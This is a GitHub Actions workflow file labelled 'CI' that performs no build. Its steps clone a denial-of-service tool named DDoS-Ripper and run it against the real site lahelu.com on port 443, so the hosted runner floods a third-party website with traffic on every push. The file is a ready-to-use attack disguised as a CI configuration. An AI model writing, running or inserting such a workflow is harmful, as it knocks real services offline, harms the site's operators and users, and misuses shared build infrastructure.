name: CI

on: [push, workflow_dispatch]

jobs:
  build:

    runs-on: windows-latest

    steps:
    - name: Download
      run: git clone https://github.com/palahsu/DDoS-Ripper
    - name: cd
      run: cd DDoS-Ripper && python3 DRipper.py -s lahelu.com -t 443
